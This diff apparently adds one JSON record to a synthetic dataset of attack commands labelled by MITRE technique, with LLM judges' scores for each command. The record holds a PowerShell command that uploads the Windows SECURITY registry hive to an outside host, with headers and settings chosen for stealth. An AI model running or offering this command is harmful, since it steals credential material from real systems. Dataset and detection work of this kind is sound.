@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1020",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$ProgressPreference='SilentlyContinue'; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://portal.examplecdn.org/ingest/syscfg/security' -Method Put -InFile 'C:\\Windows\\System32\\config\\SECURITY' -ContentType 'application/octet-stream' -Headers @{ 'User-Agent'='Mozilla/5.0 (Windows NT 10.0; Win64; x64)' } -ErrorAction SilentlyContinue",
+  "explanation": "Uploads the SECURITY hive with a TLS 1.2-only connection using HTTPS PUT and generic browser headers.",
+  "rationale_steps": [
+    "Target the SECURITY registry hive requiring SYSTEM access.",
+    "Force modern TLS and transmit via Invoke-WebRequest PUT.",
+    "Suppress progress and avoid verbose output for stealth."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1020-ed594729-1c39ba14",
+  "source_prompt_hash": "ed594729",
+  "timestamp_utc": "2025-09-30T09:16:21.768830Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed PowerShell with balanced quotes/braces, valid semicolon separators, and correct Invoke-WebRequest flags and hashtable syntax.",
+        "semantic_score": 3,
+        "semantic_justification": "It attempts HTTPS PUT exfiltration of a local file in an automated/scripted manner, but accessing the locked SECURITY hive without elevated privileges or prior export is unlikely to succeed, reducing operational plausibility.",
+        "combined_score": 4.0,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T04:16:17.331307Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is perfectly well-formed with balanced quotes, proper hashtable syntax for headers, valid semicolon separators, correct Invoke-WebRequest flags, and no syntax errors.",
+        "semantic_score": 4,
+        "semantic_justification": "The command correctly implements automated exfiltration (T1020) by uploading the SECURITY registry hive via HTTPS PUT with TLS 1.2 enforcement and browser-mimicking headers, though accessing C:\\Windows\\System32\\config\\SECURITY typically requires SYSTEM-level privileges rather than 'None', reducing operational plausibility slightly.",
+        "combined_score": 4.5,
+        "confidence": 0.92,
+        "timestamp": "2026-02-18T22:26:31.512796Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command follows correct PowerShell syntax, uses valid cmdlets, correctly handles hash tables for headers, and properly manages .NET class properties.",
+        "semantic_score": 3,
+        "semantic_justification": "While the exfiltration logic is sound, the command would fail because the SECURITY hive is locked by the System process and cannot be read directly via standard file I/O, nor can it be accessed with the specified 'None' privilege level.",
+        "combined_score": 4.0,
+        "confidence": 1,
+        "timestamp": "2026-02-18T22:26:34.110729Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 3.333,
+    "llm_average_score": 4.167,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
